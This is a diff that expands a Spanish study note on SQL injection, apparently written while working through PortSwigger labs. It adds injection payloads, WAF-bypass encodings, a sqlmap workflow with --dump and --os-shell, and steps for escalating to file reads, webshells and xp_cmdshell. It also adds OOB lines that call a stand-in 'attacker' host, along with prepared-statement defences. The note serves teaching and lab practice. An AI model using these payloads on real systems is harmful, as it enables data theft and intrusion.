@@ -1,11 +1,25 @@
 ---
-aliases: ["SQLI"]
-tags: ["hacking/web", "hacking/explotacion", "hacking/herramientas"]
-estado: 🟢 Terminado
+aliases:
+  - SQLI
+  - SQL Injection
+tags:
+  - sec/web
+  - sec/web/sqli
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Ataque de Truncado SQL]]"
+  - "[[Inyección NoSQL]]"
+  - "[[XPath y sus Vulnerabilidades]]"
+  - "[[Inyecciones LDAP]]"
+  - "[[Ataque de Asignación Masiva]]"
+fuente: "https://portswigger.net/web-security/sql-injection"
 ---
 # SQL Injection
 
-**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.
+**SQL Injection** (**SQLI**) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que **no validan adecuadamente** la entrada del usuario en la consulta SQL que se envía a la base de datos. Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos — o, con las condiciones adecuadas, para RCE, lectura/escritura de ficheros y control total del SGBD.
 
 > [!info] Prevención de SQL Injection
 > La forma más efectiva de prevenir SQL Injection es mediante el uso de **sentencias preparadas (Prepared Statements)** con parámetros vinculados. Esto asegura que la entrada del usuario sea tratada como datos y no como parte del código SQL, eliminando la posibilidad de inyección. Otras medidas incluyen la validación de entrada, el escape de caracteres especiales y el uso de ORMs que implementen estas prácticas de forma segura.
@@ -21,22 +35,258 @@ Hay varios tipos de inyecciones SQL, incluyendo:
 - **Inyección SQL basada en stacked queries**: Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla.
 
 > [!tip] Automatización con sqlmap
-> Para la detección y explotación automatizada de vulnerabilidades SQL Injection, la herramienta **sqlmap** es indispensable. Permite identificar el tipo de inyección, enumerar bases de datos, tablas, columnas y extraer datos de forma eficiente en una amplia variedad de bases de datos y escenarios.
+> Para la detección y explotación automatizada de vulnerabilidades SQL Injection, la herramienta **sqlmap** es indispensable. Permite identificar el tipo de inyección, enumerar bases de datos, tablas, columnas y extraer datos de forma eficiente en una amplia variedad de bases de datos y escenarios — ver el flujo de trabajo completo más abajo.
 
-Cabe destacar que, además de las técnicas citadas anteriormente, existen muchos otros tipos de inyecciones SQL. Sin embargo, estas son algunas de las más populares y comúnmente utilizadas por los atacantes en páginas web vulnerables.
+Además de estas, existen otras técnicas (out-of-band, second-order, [[Ataque de Truncado SQL|truncado]], inyección en `ORDER BY`/`HAVING`, y las variantes NoSQL/LDAP/XPath — [[Inyección NoSQL]], [[Inyecciones LDAP]], [[XPath y sus Vulnerabilidades]]).
 
-Asimismo, es necesario hacer una breve distinción de los diferentes tipos de bases de datos existentes:
-
-- **Bases de datos relacionales**: Las inyecciones SQL son más comunes en bases de datos relacionales como MySQL, SQL Server, Oracle, PostgreSQL, entre otros. En estas bases de datos, se utilizan consultas SQL para acceder a los datos y realizar operaciones en la base de datos.
-- **Bases de datos NoSQL**: Aunque las inyecciones SQL son menos comunes en bases de datos NoSQL, todavía es posible realizar este tipo de ataque. Las bases de datos NoSQL, como MongoDB o Cassandra, no utilizan el lenguaje SQL, sino un modelo de datos diferente. Sin embargo, es posible realizar inyecciones de comandos en las consultas que se realizan en estas bases de datos. Esto lo veremos unas clases más adelante.
-- **Bases de datos de grafos**: Las bases de datos de grafos, como Neo4j, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los nodos y relaciones que se han almacenado en la base de datos.
-- **Bases de datos de objetos**: Las bases de datos de objetos, como db4o, también pueden ser vulnerables a inyecciones SQL. En estas bases de datos, se utilizan consultas para acceder a los objetos que se han almacenado en la base de datos.
-
-Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.
+Es necesario distinguir también los tipos de bases de datos: las **relacionales** (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) son el objetivo clásico de SQLI; las **NoSQL**, **de grafos** (Neo4j, con su propio lenguaje Cypher) y **de objetos** tienen vectores análogos pero con gramáticas distintas.
 
 A continuación, se proporciona el enlace a la utilidad online de ‘**ExtendsClass**‘ que utilizamos en esta clase:
 
 - **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
+
+## Mecánica: gramática SQL y cómo nace la inyección
+
+Una consulta SQL es **código** interpretado por el SGBD. El bug aparece cuando la app concatena datos del usuario dentro de ese código:
+
+```sql
+-- La consulta del desarrollador (con comillas → contexto string)
+SELECT username FROM users WHERE id = '1'
+-- La consulta del atacante: id = 1' OR '1'='1
+SELECT username FROM users WHERE id = '1' OR '1'='1'
+```
+
+```sql
+-- Sin comillas (contexto numérico) — no requiere '
+SELECT username FROM users WHERE id = 1 OR 1=1
+```
+
+### Estructura de un SELECT — los puntos de inyección
+
+```sql
+SELECT columnas FROM tabla WHERE condición GROUP BY cols HAVING filtro
+      ①        ②        ③           ④          ⑤           ⑥
+      ORDER BY columna DIR LIMIT n OFFSET m;   -- ; segunda sentencia (stacked)
+                         ⑦                      ⑧
+```
+
+| # | Punto | Qué controla el atacante | Técnica asociada |
+|---|---|---|---|
+| ① | Lista de SELECT | Expresiones proyectadas | UNION, subqueries, funciones |
+| ② | Identificador de tabla | `information_schema`, otras tablas | Enumeración |
+| ③ | WHERE (valor) | Cuentas, filtros, cookies (`TrackingId`) | Boolean/time blind, UNION, login bypass |
+| ④ | GROUP BY / HAVING | Agregaciones | Inyección en agregados |
+| ⑤ | ORDER BY | **Posición** — no admite subqueries | Detección de nº de columnas |
+| ⑥ | LIMIT/OFFSET | Paginación | Blind por paginación |
+| ⑦ | Valores de INSERT/UPDATE/DELETE | Escritura directa | Update/delete masivo, plantillas de backdoor |
+| ⑧ | `;` + sentencia | Ejecución de sentencias extra | **Stacked queries** |
+
+Otros puntos menos obvios: `INSERT` (valores a insertar), `UPDATE ... SET x=`, `DELETE ... WHERE`, `LIKE '%input%'`, nombres de tabla/columna (identificadores → no hay comillas: bypass vía allowlist), y **segundo orden** (input almacenado y concatenado en otra query posterior).
+
+### Detección y fingerprinting
+
+| Señal | Payload típico | Lectura |
+|---|---|---|
+| Error de sintaxis | `'`, `"`, `\` | Contexto de comillas revelado |
+| Tautología | `' OR '1'='1` | Cambio de resultados → inyectable |
+| Comentario | `-- -`, `#`, `/* */` | Cierre de la consulta |
+| Orden | `ORDER BY 100` vs `ORDER BY 1` | Nº de columnas/validez |
+| Aritmética | `id=1+1` (numérico) o `id=2-1` | Contexto numérico |
+| Retardo | `and sleep(5)-- -` | Time-based |
+| Error 500 selectivo | `' AND 1=CONVERT(int,(SELECT...))` | Error-based |
+
+**Fingerprint del SGBD** (clave para elegir funciones):
+
+| Señal | DBMS |
+|---|---|
+| `SLEEP()` funciona | MySQL/MariaDB |
+| `PG_SLEEP()` / cast `::` | PostgreSQL |
+| `WAITFOR DELAY` | Microsoft SQL Server |
+| `DBMS_PIPE.RECEIVE_MESSAGE` / tabla `dual` obligatoria | Oracle |
+| `sqlite_version()` / `sqlite_master` | SQLite |
+| Errores `ORA-`, `SQLSTATE`, `SQL Server` | Mensajes explícitos |
+| `LIMIT` vs `TOP` vs `FETCH FIRST` | Dialecto |
+
+> [!warning] Comillas vs números
+> No todas las SQLI empiezan con `'`: si el developer escribe `WHERE id = $id` (sin comillas) no hace falta cerrar nada. Probar siempre ambos contextos.
+
+## Ataque UNION: metodología completa
+
+UNION combina los resultados de dos SELECT — pero exige **coincidencia exacta de estructura**:
+
+1. **Determinar el número de columnas**: `ORDER BY n` incremental (o binario). Si `ORDER BY 3` da error y `ORDER BY 2` no → 2 columnas. Alternativa: `UNION SELECT NULL,NULL` (añadir NULL hasta que la query pase).
+2. **Encontrar la columna visible (texto)**: `UNION SELECT 'a',NULL` / `NULL,'a'` por posición — la que refleja en la página es la inyectable.
+3. **Matching de tipos**: la columna visible espera texto → pasar strings; si espera número, pasar números. `NULL` es compatible con todo — por eso se usa para sondear.
+4. **Posición de datos**: inyectar en una posición que la app **no** filtra (p. ej. con `id=100'`, id inexistente, para que el primer SELECT no devuelva nada y solo se vea el UNION).
+5. **Extraer**: `UNION SELECT group_concat(schema_name),NULL FROM information_schema.schemata` y seguir la cadena: bases → tablas → columnas → datos.
+
+```sql
+-- Cadena canónica (MySQL), con id=100 para vaciar el primer SELECT
+100' UNION SELECT group_concat(table_name),NULL
+  FROM information_schema.tables WHERE table_schema='public'-- -
+```
+
+> [!tip] Una sola columna = concatena todo
+> Si solo hay una columna visible, usar `group_concat(a,':',b)` (MySQL), `string_agg(a||':'||b,',')` (PG), `LISTAGG` (Oracle) o `a+':'+b` (MSSQL con `+`) para volcar varias columnas en un campo. En PostgreSQL, `||` (pipes) es el operador de concatenación — clave para blind con delays vía `';select case...`.
+
+## Catálogo de funciones por base de datos
+
+| Función | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
+|---|---|---|---|---|---|
+| Versión | `version()` | `version()` | `@@version` | `(SELECT banner FROM v$version)` | `sqlite_version()` |
+| Usuario | `user()`, `current_user()` | `current_user` | `SYSTEM_USER` | `SYS_CONTEXT('USERENV','SESSION_USER')` | — |
+| BD actual | `database()` | `current_database()` | `DB_NAME()` | `SYS_CONTEXT('USERENV','DB_NAME')` | — |
+| Tablas del sistema | `information_schema.tables` | `information_schema.tables` | `INFORMATION_SCHEMA.TABLES` | `ALL_TABLES` / `USER_TABLES` | `sqlite_master` |
+| Columnas | `information_schema.columns` | `information_schema.columns` | `INFORMATION_SCHEMA.COLUMNS` | `ALL_TAB_COLUMNS` | `PRAGMA table_info(t)` |
+| Concatenar | `concat(a,b)`, `group_concat()` | `a||b`, `string_agg()` | `a+b` | `a||b`, `LISTAGG()` | `a||b` |
+| Subcadena | `substr()`, `substring()` | `substr()`, `substring()` | `SUBSTRING()`, `SUBSTR()` | `SUBSTR()` | `substr()` |
+| Longitud | `length()` | `length()` | `LEN()` | `LENGTH()` | `length()` |
+| ASCII | `ascii()` | `ascii()` | `ASCII()` | `ASCII()` | — |
+| Retardo | `SLEEP(n)`, `BENCHMARK()` | `pg_sleep(n)` | `WAITFOR DELAY '0:0:5'` | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` | — |
+| Condición | `IF(c,a,b)`, `CASE` | `CASE WHEN` | `CASE WHEN` | `CASE WHEN` | `CASE WHEN` |
+| Lectura fichero | `LOAD_FILE('/etc/passwd')` | `pg_read_file()` | `OPENROWSET(BULK...)` | `UTL_FILE` | — |
+| Escritura fichero | `INTO OUTFILE` | `COPY ... TO` | `xp_cmdshell`/`sp_OACreate` | `UTL_FILE` | — |
+| OS / red | `sys_exec()` (udf) | plpython / `LO_IMPORT` | `xp_cmdshell`, `xp_dirtree` | `UTL_HTTP.REQUEST`, `DBMS_LDAP` | — |
+| OOB DNS | `LOAD_FILE('\\\\attacker\\a')` | — | `xp_dirtree '\\\\attacker\\a'` | `UTL_INADDR` | — |
+
+### Stacked queries por DBMS
+
+| DBMS | ¿Soporta? | Notas |
+|---|---|---|
+| **MySQL** | Solo con `mysqli_multi_query` | `mysql_query()` normal NO ejecuta la segunda sentencia |
+| **PostgreSQL** | Sí (pg_query ejecuta múltiples) | Separar con `;` (URL-encodear `%3b` en cookies) |
+| **MSSQL** | Sí (batches / `sp_executesql`) | `'; DROP TABLE x;--` |
+| **Oracle** | **No** | Solo bloques PL/SQL anónimos vía vectores especiales |
+| **SQLite** | Sí (`sqlite3_exec`) | Múltiples sentencias separadas por `;` |
+
+> [!info] Segundo orden (*second-order*)
+> El input no se inyecta en la petición que lo recibe: se **almacena** (nombre de usuario, dirección) y se concatena en una query posterior (login, panel de admin). Detectar: rellenar formularios con payloads `'` y observar errores en pantallas posteriores. La defensa con prepared statements debe aplicarse en **ambas** ejecuciones.
+
+## Evasión de WAF y filtros
+
+> [!tip] Técnicas de Bypass de WAF para SQLI
+> Los Web Application Firewalls (WAFs) intentan detectar y bloquear payloads de SQLI. Para evadirlos, se pueden usar varias técnicas:
+> *   **Codificación**: URL encoding (`%27`), HTML encoding (`&#x27;`), Unicode encoding (`%u0027`), Hex encoding (`0x27`).
+> *   **Comentarios**: `/*!UNION SELECT*/` (MySQL-specific).
+> *   **Espacios alternativos**: `/**/`, `()`, `+`, `%09`, `%0a`, `%0d`.
+> *   **Mayúsculas/Minúsculas**: `union select` vs `UNION SELECT`.
+> *   **Inyección de basura**: Añadir caracteres irrelevantes que el WAF no espera.
+> *   **Polimorfismo**: Usar diferentes sintaxis SQL para la misma operación.
+
+Vectores adicionales probados en el lab "filter bypass via XML encoding":
+
+| Vector | Mecanismo |
+|---|---|
+| **Codificación XML/entidades** | El WAF filtra el body crudo; el parser XML decodifica después: `<x>&#x55;&#x4e;ION SELECT` |
+| **Hackvertor** (extensión Burp) | Codificación *hex entity* / *encode* automática por tag |
+| **Funciones equivalentes** | `substring`→`mid`, `concat`→`concat_ws`, `if`→`case when` |
+| **Sin espacios** | `UNION/**/SELECT`, `WHERE(1)=(1)` |
+| **Case + commentos** | `unioN/**/sElEcT` |
+| **Límites de campo** | Acortar `TrackingId` (liberar bytes) y comprimir el payload con subqueries |
+
+## sqlmap: flujo de trabajo
+
+```bash
+# 1. Detección básica
+sqlmap -u 'http://app/search?id=1' --batch --level 3 --risk 2
+
+# 2. Cookie / header / POST / request file
+sqlmap -u 'http://app/' --cookie='TrackingId=*' --batch
+sqlmap -r request.txt --level 3            # desde archivo (Burp)
+sqlmap -u 'http://app/' --data='id=1' --method=POST
+
+# 3. Enumeración
+sqlmap -u '...' --dbs                      # bases de datos
+sqlmap -u '...' -D public --tables         # tablas
+sqlmap -u '...' -D public -T users --columns
+sqlmap -u '...' -D public -T users --dump  # volcado
+
+# 4. Técnicas y rendimiento
+sqlmap -u '...' --technique=BEUST          # Boolean, Error, Union, Stacked, Time
+sqlmap -u '...' --time-sec=5 --threads=10
+sqlmap -u '...' --os-shell                 # si hay escalada a OS
+sqlmap -u '...' --tamper=space2comment,between   # WAF bypass
+
+# 5. Ciego / OOB
+sqlmap -u '...' --dns-domain=TU-COLLAB.net
+```
+
+| Flag | Para qué |
+|---|---|
+| `--batch` | Respuestas automáticas (sin intervención) |
+| `--level 1-5` / `--risk 1-3` | Profundidad de tests / riesgo de payloads |
+| `--technique=BEUST` | Seleccionar clases de inyección |
+| `--dbms=mysql` | Fuerza el dialecto (ahorra tiempo) |
+| `--threads` / `--time-sec` | Paralelismo / umbral de retardo |
+| `--tamper=<script>` | Ofuscación de payloads |
+| `--os-shell` / `--file-read` | Escalada a sistema de archivos/OS |
+| `--flush-session` | Ignorar caché de la sesión anterior |
+
+## Metodología manual paso a paso
+
+1. **Localizar puntos**: todos los parámetros (GET/POST/cookies/headers como `User-Agent`, `Referer`, `X-Forwarded-For`), rutas REST (`/api/users/1`), orderings (`?sort=`), búsqueda.
+2. **Clasificar el contexto**: string vs numérico (probar `'` y `1+1`), comillas escapadas vs no.
+3. **Fingerprintear el SGBD** (tabla arriba).
+4. **Elegir la técnica** por señal: error visible → error-based; contenido diferencial → boolean blind; timeout → time blind; salida reflejada → UNION; nada → OOB/stacked/second-order.
+5. **Extraer**: esquema completo → datos sensibles (usuarios, hashes, PII, tokens).
+6. **Escalada**: `INTO OUTFILE`/webshell, `xp_cmdshell`, UDF, `COPY TO program` (PG) → RCE; leer `/etc/shadow` con FILE privilege.
+7. **Automatizar**: sqlmap para volcados masivos; scripts propios (`requests` + `pwn.log` + `r.elapsed`) para labores finas (ver los scripts de las notas prácticas).
+
+> [!info] Indicadores en SQLI ciegas
+> En las SQLI ciegas, donde no hay salida directa en la página, es crucial observar indicadores indirectos: **códigos de estado HTTP** (200 vs 404/500), **tiempos de respuesta**, y **cambios mínimos de contenido** ("Welcome back!"). En blind con condicional se compara byte a byte: `substring(dato,pos,1)='a'` — o `ascii(substring(...))=97` para evitar comillas.
+
+## Defensa (con código)
+
+```php
+// VULNERABLE
+mysqli_query($conn, "SELECT username FROM users WHERE id = '$id'");
+
+// SEGURO 1: prepared statement (mysqli)
+$stmt = mysqli_prepare($conn, "SELECT username FROM users WHERE id = ?");
+mysqli_stmt_bind_param($stmt, "i", $id);   // 'i' int, 's' string
+mysqli_stmt_execute($stmt);
+$result = mysqli_stmt_get_result($stmt);
+
+// SEGURO (PDO) — el patrón preferido
+$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :u');
+$stmt->execute(['u' => $username]);
+```
+
+```python
+# SEGURO (Python)
+cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))     # psycopg2
+conn.execute("SELECT * FROM users WHERE id = ?", (user_id,))     # sqlite3
+
+# VULNERABLE (jamás): conn.execute(f"SELECT ... WHERE id = {user_id}")
+```
+
+```java
+// SEGURO (Java JDBC)
+PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
+ps.setInt(1, userId);
+ResultSet rs = ps.executeQuery();
+```
+
+```javascript
+// SEGURO (Node/mysql2)
+const [rows] = await pool.query('SELECT * FROM users WHERE id = ?', [userId]);
+```
+
+Reglas duras:
+1. **Prepared statements en TODA consulta** que mezcle datos — sin excepciones ni "solo esta vez".
+2. **Identificadores (tablas, columnas, ORDER BY) nunca se parametrizan**: usar **allowlist** de valores:
+
+```python
+# ORDER BY no admite parámetros → allowlist explícita
+ALLOWED_SORT = {"date": "created_at", "name": "username"}
+col = ALLOWED_SORT.get(request.args.get("sort"), "created_at")
+cur.execute(f"SELECT * FROM products ORDER BY {col} ASC")  # col ∈ allowlist fija
+```
+
+3. **Mínimo privilegio DB**: el usuario de la app sin `FILE`, sin `xp_cmdshell`, sin `DROP`, sin acceso a otras BD.
+4. **Desactivar stacked queries** y respuestas de error verbose en producción (`display_errors=Off`).
+5. WAF como **defensa complementaria**, nunca primaria.
+6. ORM seguro: los ORM son seguros **si** no se usan escapes de lenguaje crudo (`.raw()`, `text()`, `extra()`) con input.
 
 ## Notas Prácticas
 
@@ -1015,3 +1265,60 @@ Ya vemos las bases de datos y a partir de aquí es lo que ya conocemos:
 
 ![[Pasted image 20250905160208.png]]
 Lab Terminado.
+
+## Errores comunes
+
+**Del atacante:**
+1. Empezar siempre con `'` sin probar el contexto numérico: muchas SQLI no llevan comillas.
+2. Mal cierre de comentario: MySQL acepta `#` y `-- ` (con espacio final); MSSQL/PG necesitan `-- ` o `/* */`. Un `--` sin espacio deja la query rota (falso negativo).
+3. ORDER BY con subqueries: la posición no las admite — para contar columnas ORDER BY, para extraer UNION/subqueries.
+4. UNION sin vaciar el primer SELECT: si el `WHERE id=1` devuelve fila, la app puede mostrar solo la primera — usar id inexistente.
+5. No matching de tipos en UNION (string donde espera int) → error 500 y falso "no vulnerable".
+6. Time-based con umbrales arbitrarios: en BD lentas, medir baseline y usar deltas (0.35s vs 3s); `sleep()` se ejecuta **por fila** — puede multiplicarse el retardo.
+7. Ignorar `r.elapsed` y confiar en impresiones: medir siempre con temporizador.
+8. Probar solo en parámetros de URL y olvidar cookies (`TrackingId`), headers y POSTs.
+
+**Del defensor:**
+1. Prepared statements en el login pero concatenación en el informe interno: la app es tan segura como su query más débil.
+2. `mysqli_real_escape_string` sin comillas en la query: no protege nada en contexto numérico.
+3. Cambiar `mysql_real_escape_string` por `addslashes`: con charset mal configurado (GBK) hay bypass multibyte.
+4. Dejar `display_errors=On` en producción: convierte cualquier SQLI en error-based trivial.
+5. Usuario de la app con privilegios de DBA: una SQLI trivial escala a RCE vía `xp_cmdshell`/`INTO OUTFILE`.
+6. "Sanitizar" con blacklist de palabras (`SELECT`, `OR`): WAF casero que cualquier comentario/encoding bypasea.
+
+## Cheatsheet
+
+| Paso | Payload / acción |
+|---|---|
+| Contexto | `'` / `1+1` / `"` |
+| Comentario cierre | `-- -`, `#`, `')-- -` |
+| Columnas | `ORDER BY n` / `UNION SELECT NULL,NULL-- -` |
+| Columna visible | `UNION SELECT 'a',NULL-- -` |
+| Versiones | `version()` / `@@version` / `sqlite_version()` / `v$version` |
+| Enumerar | `information_schema.schemata/tables/columns` (PG/MySQL/MSSQL), `ALL_TABLES` (Oracle), `sqlite_master` |
+| Volcado | `group_concat(username,0x3a,password)` (MySQL), `string_agg`, `LISTAGG`, `a||b` |
+| Boolean blind | `and (select ascii(substr((select ...),pos,1)))=97` |
+| Time blind | `sleep(5)` / `pg_sleep(5)` / `WAITFOR DELAY '0:0:5'` / `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` |
+| Error-based | `extractvalue`/`updatexml` (MySQL), `CAST(… AS int)` (MSSQL), `to_char(1/0)` (Oracle) |
+| Stacked | `;` (`%3b` en cookie) — PG/MSSQL/SQLite |
+| OOB | `xp_dirtree '\\COLLAB\a'`, `LOAD_FILE('\\COLLAB\a')`, `UTL_HTTP` |
+| Automatizar | `sqlmap -u ... --batch --level 3 --technique=BEUST` |
+| Defensa | Prepared statements + allowlist de identificadores + mínimo privilegio |
+
+## Laboratorios y referencias
+
+- **PortSwigger Academy — SQL Injection**: https://portswigger.net/web-security/sql-injection (todos los labs resueltos en esta nota: WHERE, login bypass, Oracle/MSSQL/MySQL, UNION, blind boolean/errores/tiempo, error-based visible, OOB, XML/Hackvertor)
+- **PortSwigger Cheat Sheet — SQL injection**: https://portswigger.net/web-security/sql-injection/cheat-sheet
+- **PayloadsAllTheThings — SQL Injection**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+- **sqlmap documentation**: https://github.com/sqlmapproject/sqlmap/wiki
+- **ExtendsClass MySQL online**: https://extendsclass.com/mysql-online.html
+- Notas internas: [[Ataque de Truncado SQL]], [[Inyección NoSQL]], [[XPath y sus Vulnerabilidades]], [[Inyecciones LDAP]]
+
+## Relacionadas
+
+- [[Ataque de Truncado SQL]] — la prima "lógica": truncar en vez de inyectar
+- [[Inyección NoSQL]] — el mismo concepto con gramáticas JSON/Mongo
+- [[XPath y sus Vulnerabilidades]] — inyección en consultas XML
+- [[Inyecciones LDAP]] — inyección en directorios
+- [[Ataque de Asignación Masiva]] — cómo ciertos frameworks mapean inputs a queries
+- [[Information disclosure]] — los errores verbose que convierten SQLI ciega en visible
